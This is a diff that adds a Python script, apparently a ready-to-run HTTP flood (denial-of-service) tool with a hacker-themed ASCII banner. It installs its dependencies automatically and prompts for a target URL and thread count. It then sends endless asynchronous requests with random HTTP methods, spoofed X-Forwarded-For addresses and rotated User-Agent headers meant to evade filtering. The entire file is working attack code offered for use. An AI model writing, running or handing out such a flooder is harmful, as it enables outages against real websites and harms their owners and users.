@@ -1,0 +1,240 @@
+import os
+import sys
+import time
+import threading
+import socket
+from urllib.parse import urlparse
+import random
+import importlib.util
+import subprocess
+import asyncio
+
+REQUIRED = ["requests", "colorama", "httpx"]
+
+def typewriter(text, delay=0.04):
+    for char in text:
+        sys.stdout.write(f"\033[91m{char}\033[0m")
+        sys.stdout.flush()
+        time.sleep(delay)
+    print("")
+
+def check_and_install():
+    os.system("clear")
+    typewriter("We are a mastermind", delay=0.07)
+    time.sleep(0.5)
+    os.system("clear")
+    print(f"""\033[91m
+█████▒ ██████  ▒█████   ▄████▄   ██▓▓█████▄▄▄█████▓▓██   ██▓
+▓██   ▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒▓█   ▀▓  ██▒ ▓▒ ▒██  ██▒
+▒████ ░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒▒███  ▒ ▓██░ ▒░  ▒██ ██░
+░▓█▒  ░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░▒▓█  ▄░ ▓██▓ ░   ░ ▐██▓░
+░▒█░   ▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░░▒████▒ ▒██▒ ░   ░ ██▒▓░
+▒ ░   ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓  ░░ ▒░ ░ ▒ ░░      ██▒▒▒
+░     ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░ ░ ░  ░   ░     ▓██ ░▒░
+░ ░   ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░   ░    ░       ▒ ▒ ░░
+░      ░ ░  ░ ░       ░     ░  ░         ░ ░
+░                            ░ ░
+\033[0m
+<Welcome!>
+""")
+
+    spinner = "|/-\\"
+    idx = 0
+    print("Checking dependencies...\n")
+    for pkg in REQUIRED:
+        try:
+            importlib.import_module(pkg)
+        except ImportError:
+            for _ in range(6):
+                sys.stdout.write(f"\r[\033[91m{spinner[idx % 4]}\033[0m] Checking {pkg}...")
+                sys.stdout.flush()
+                time.sleep(0.1)
+                idx += 1
+            print(f"\n[+] Installing {pkg}")
+            try:
+                subprocess.run(["pip", "install", pkg], check=True)
+            except:
+                print(f"\033[91m[-] Failed to install {pkg}\033[0m")
+                sys.exit(1)
+    time.sleep(1)
+
+check_and_install()
+
+import requests
+import httpx
+from colorama import Fore, Style, init
+init(autoreset=True)
+
+RED = Fore.RED
+GREEN = Fore.GREEN
+WHITE = Fore.WHITE
+BLUE = Fore.BLUE
+
+BANNER = f"""{RED}
+█████▒ ██████  ▒█████   ▄████▄   ██▓▓█████▄▄▄█████▓▓██   ██▓
+▓██   ▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒▓█   ▀▓  ██▒ ▓▒ ▒██  ██▒
+▒████ ░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒▒███  ▒ ▓██░ ▒░  ▒██ ██░
+░▓█▒  ░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░▒▓█  ▄░ ▓██▓ ░   ░ ▐██▓░
+░▒█░   ▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░░▒████▒ ▒██▒ ░   ░ ██▒▓░
+▒ ░   ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓  ░░ ▒░ ░ ▒ ░░      ██▒▒▒
+░     ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░ ░ ░  ░   ░     ▓██ ░▒░
+░ ░   ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░   ░    ░       ▒ ▒ ░░
+░      ░ ░  ░ ░       ░     ░  ░         ░ ░
+░                            ░ ░
+"""
+
+def clear(): os.system("clear")
+
+def input_box(title, user_input=""):
+    border = f"{RED}+{'-'*34}+"
+    label = f"{RED}|  {WHITE}{title.center(30)}  {RED}|"
+    input_line = f"{RED}| > {WHITE}{user_input.ljust(30)}{RED}|"
+    return f"{border}\n{label}\n{input_line}\n{border}"
+
+def get_ip():
+    try:
+        return requests.get("https://api.ipify.org").text
+    except:
+        return "0.0.0.0"
+
+def check_url_live(url):
+    try:
+        if not urlparse(url).scheme:
+            url = "http://" + url
+        r = requests.get(url, timeout=4, headers={"User-Agent": "Mozilla/5.0"})
+        return r.status_code < 500
+    except:
+        return False
+
+def rotating_status(text, duration=2):
+    spinner = "|/-\\"
+    start = time.time()
+    idx = 0
+    while time.time() - start < duration:
+        sys.stdout.write(f"{WHITE}[{spinner[idx % 4]}] {text}   \r")
+        sys.stdout.flush()
+        idx += 1
+        time.sleep(0.1)
+    print(" " * 50, end="\r")
+
+def generate_random_headers():
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
+        "Mozilla/5.0 (Linux; Android 10)",
+    ]
+    accept = [
+        "text/html,application/xhtml+xml,application/xml;q=0.9",
+        "application/json, text/plain, */*",
+        "*/*",
+    ]
+    return {
+        "User-Agent": random.choice(user_agents),
+        "Accept": random.choice(accept),
+        "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
+        "Referer": "https://google.com",
+        "Cache-Control": "no-cache",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+    }
+
+async def async_attack(url, packet_counter, print_logs):
+    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"]
+    async with httpx.AsyncClient(timeout=1) as client:
+        while True:
+            try:
+                method = random.choice(methods)
+                headers = generate_random_headers()
+                data = {"data": "x"} if method in ["POST", "PUT", "PATCH"] else None
+                await client.request(method, url, headers=headers, data=data)
+                packet_counter[0] += 1
+                if print_logs and packet_counter[0] % 100 == 0:
+                    print(f"{RED}Packet {packet_counter[0]} sent ({method}){Style.RESET_ALL}")
+            except:
+                pass
+
+def run_attack(url, threads, print_logs):
+    packet_counter = [0]
+    
+    async def main():
+        tasks = []
+        for _ in range(threads):
+            task = asyncio.create_task(async_attack(url, packet_counter, print_logs))
+            tasks.append(task)
+        await asyncio.gather(*tasks)
+    
+    def start_loop():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(main())
+    
+    try:
+        if not print_logs:
+            status_thread = threading.Thread(target=start_loop, daemon=True)
+            status_thread.start()
+            
+            while True:
+                print(f"{GREEN}Packets: {packet_counter[0]}    (Ctrl+C to stop)", end="\r")
+                time.sleep(3)
+        else:
+            start_loop()
+    except KeyboardInterrupt:
+        print(f"{RED}\nAttack stopped by user.")
+
+def main():
+    while True:
+        clear()
+        print(BANNER)
+        print(input_box("TARGET URL"))
+        sys.stdout.write("\033[F\033[F\033[C\033[C\033[C\033[C\033[C\033[C\033[C")
+        url = input().strip()
+        if not url:
+            continue
+        full_url = url if urlparse(url).scheme else f"http://{url}"
+        print("\n[~] Checking site...")
+        if not check_url_live(full_url):
+            print(f"{RED}<Error: URL is NOT valid>")
+            time.sleep(2)
+            continue
+        print(f"{GREEN}[✓] URL is valid")
+        time.sleep(1.5)
+        break
+
+    while True:
+        clear()
+        print(BANNER)
+        print(input_box("TARGET URL", full_url))
+        print()
+        print(input_box("THREADS"))
+        sys.stdout.write("\033[F\033[F\033[C\033[C\033[C\033[C\033[C\033[C\033[C")
+        threads_input = input().strip()
+        if not threads_input:
+            threads = 20
+            break
+        elif threads_input.isdigit():
+            threads = int(threads_input)
+            break
+        else:
+            print(f"{RED}Invalid input. Retry.")
+            time.sleep(1)
+
+    clear()
+    print(input_box("Do you want to print the logs? [y/n]"))
+    sys.stdout.write("\033[F\033[F\033[C\033[C\033[C\033[C\033[C\033[C\033[C")
+    print_logs = input().strip().lower() == "y"
+
+    print(f"\n{WHITE}/\\ Start attack? [y/n]")
+    if input("> ").lower() == "y":
+        clear()
+        print(BANNER)
+        rotating_status("Starting attack...", duration=2)
+        run_attack(full_url, threads, print_logs)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"{RED}\nExiting...")
+EOF
